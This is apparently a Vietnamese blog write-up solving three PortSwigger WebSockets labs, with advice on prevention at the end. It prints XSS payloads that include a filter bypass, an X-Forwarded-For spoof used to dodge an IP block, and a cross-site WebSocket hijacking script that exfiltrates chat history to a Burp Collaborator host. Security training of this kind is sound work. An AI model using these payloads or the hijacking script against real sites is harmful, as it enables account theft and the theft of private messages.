---
title: "[PortSwigger Lab] - WebSockets"
description: Solution of WebSockets Lab
date: 2025-06-23 18:00:00 +0700
categories: [Cyber ​​Security, Web Pentest]
tags: [portswigger, burpsuite, labs, web, vulnerability, websockets]   
pin: false
comments: true
image:
    path: https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-06-23-portswigger-lab-websockets/websockets.png
    alt: WebSockets
---

## Introduction
---
### **WebSockets**
**WebSocket** là một giao thức giao tiếp hai chiều **(bi-directional)** và toàn song công **(full duplex)**, được khởi tạo thông qua **HTTP**. **WebSocket** thường được sử dụng trong các ứng dụng web hiện đại để truyền dữ liệu theo **thời gian thực** hoặc các dữ liệu **bất đồng bộ (asynchronous)**.

| Đặc điểm              | HTTP                                    | WebSocket                                               |
| --------------------- | --------------------------------------- | ------------------------------------------------------- |
| Kiểu giao tiếp        | Yêu cầu – Phản hồi (Request – Response) | Hai chiều – có thể gửi nhận bất kỳ lúc nào              |
| Kết nối               | Thường kết thúc sau mỗi phản hồi        | Giữ kết nối lâu dài cho đến khi client hoặc server đóng |
| Gửi dữ liệu từ server | Không thể chủ động                      | Có thể chủ động gửi từ server đến client bất kỳ lúc nào |
| Ứng dụng điển hình    | Truy cập trang web, API đơn giản        | Chat, dữ liệu tài chính theo thời gian thực, game, v.v. |

## Solve WebSockets Lab
--- 
### Lab: Manipulating WebSocket messages to exploit vulnerabilities
- Gửi 1 tin nhắn bất kỳ 
- Quan sát `/resources/js/chat.js` ta thấy dữ liệu được **encode** rồi mỗi gửi đi thông qua **websocket** => Điều này chỉ hoạt động tốt trên trình duyệt

```js
function htmlEncode(str) {
    if (chatForm.getAttribute("encode")) {
        return String(str).replace(/['"<>&\r\n\\]/gi, function (c) {
            var lookup = {'\\': '&#x5c;', '\r': '&#x0d;', '\n': '&#x0a;', '"': '&quot;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '&': '&amp;'};
            return lookup[c];
        });
    }
    return str;
}
```
- Đến **Proxy** > **WebSockets history** > chọn **request** có chứa tin nhắn đã gửi và gửi đến **Repeater**
- Gửi lại **request** với **payload**

```json
{"message":"<img src=1 onerror=alert()>"}
```
- **Reload page** để xem kết quả
- Gửi thông qua **Repeater** để bỏ qua bước **encode** đầu vào => **XSS** xảy ra

### Lab: Manipulating the WebSocket handshake to exploit vulnerabilities
- Gửi 1 tin nhắn bất kỳ 
- Quan sát `/resources/js/chat.js` ta thấy dữ liệu được **encode** rồi mỗi gửi đi thông qua **websocket** => Điều này chỉ hoạt động tốt trên trình duyệt

```js
function htmlEncode(str) {
    if (chatForm.getAttribute("encode")) {
        return String(str).replace(/['"<>&\r\n\\]/gi, function (c) {
            var lookup = {'\\': '&#x5c;', '\r': '&#x0d;', '\n': '&#x0a;', '"': '&quot;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '&': '&amp;'};
            return lookup[c];
        });
    }
    return str;
}
```
- Đến **Proxy** > **WebSockets history** > chọn **request** có chứa tin nhắn đã gửi và gửi đến **Repeater**
- Gửi lại **request** với **payload**

Request
```json
{"message":"<img src=1 onerror=alert(1)>"}
```

Response
```json
{"error":"Attack detected: Event handler"}
```
- Không chấp nhận **event** `onerror`
- Ứng dụng sẽ ngắt kết nối sau khi `Attack detected` => Không gửi được tin nhắn
- Click **Reconnect** và thêm trường `X-Forwarded-For: 1.1.1.1` để theo túng **handshake** > **Connect**
- **Server** chấp nhận kết nối, ta sửa **payload** và gửi lại

```json
{"message":"<img src=1 oNeRrOr=alert`1`>"}
```
- **XSS** xảy ra
- Nếu sử dụng  `alert(1)` => `"error":"Attack detected: Alert"`

### Lab: Cross-site WebSocket hijacking
- Gửi 1 tin nhắn bất kỳ 
- Quan sát `/resources/js/chat.js` ta thấy ứng dụng khởi tạo **WebSocket**
- Để bắt đầu cuộc trò chuyện **client** phải gửi `"READY"`

```js
newWebSocket.onopen = function (evt) {
    writeMessage("system", "System:", "No chat history on record");
    newWebSocket.send("READY");
    res(newWebSocket);
};
```
- **Client** chờ và nhận **message** hiển thị ra

```js
newWebSocket.onmessage = function (evt) {
    var message = evt.data;
    writeMessage("abcxyz");
    ...
}
```
- Đến **exploit server** và thêm **script** vào body > **deliver to victim**

```html
<script>
let newWebSocket = new WebSocket("wss://0adc00f803ce77578009120500030005.web-security-academy.net/chat");

newWebSocket.onopen = function () {
    newWebSocket.send("READY");
};

newWebSocket.onmessage = function (evt) {
    var message = evt.data;
    fetch(`https://oe6zhtw7tilwkwhbomnhcwareik98zwo.oastify.com/${encodeURIComponent(message)}`);
};

</script>
```
- Khi **client** truy cập vào => khởi tạo kết nối **WebSocket** => lấy **message** được **server** gửi về và gửi đến **Burp Collaborator**
- Đến **Burp Collaborator** > **Poll now** để nhận request đến 
- Quan sát các **path**, bôi đen và nhìn sang tab **Inspector** => account của `carlos` 
- Login bằng account `carlos`

## Prevent
---
### Using **wss:// (TLS)**
- Mã hóa kết nối để ngăn kẻ tấn công nghe lén hoặc sửa đổi dữ liệu.

### Do not generate **WebSocket URL** from user data

```js
// ❌ Không làm:
var ws = new WebSocket("wss://" + location.host + userInput + "/chat");

// ✅ Làm đúng:
var ws = new WebSocket("wss://example.com/chat");
```

### Protect **handshake** from **CSRF**
**WebSocket** không hỗ trợ **SameSite cookie** hoặc gửi **header Origin** đầy đủ như **HTTP POST/GET**, nên cần bảo vệ thủ công.
- Kiểm tra **Origin** hoặc **Referer** trong **request handshake**
- Sử dụng **CSRF token**:
    - **Client** gửi **token** trong **message** đầu tiên (ví dụ `"INIT": "csrf_token"`).
    - **Server** kiểm tra **token** trước khi cho phép thực hiện hành động.

### Treat **WebSocket** data as untrusted data
Dữ liệu từ **WebSocket** có thể đến từ **attacker** — cần **escape**, **validate**, và **sanitize** đầy đủ.

| Kiểu tấn công         | Biện pháp                                         |
| --------------------- | ------------------------------------------------- |
| **SQL Injection**     | Dùng prepared statement, không chèn trực tiếp     |
| **XSS**               | Escape đầu ra (`htmlEncode`, `CSP`, DOMPurify...) |
| **Command injection** | Không chạy dữ liệu đầu vào trong shell            |

---
Goodluck! 🍀🍀🍀 


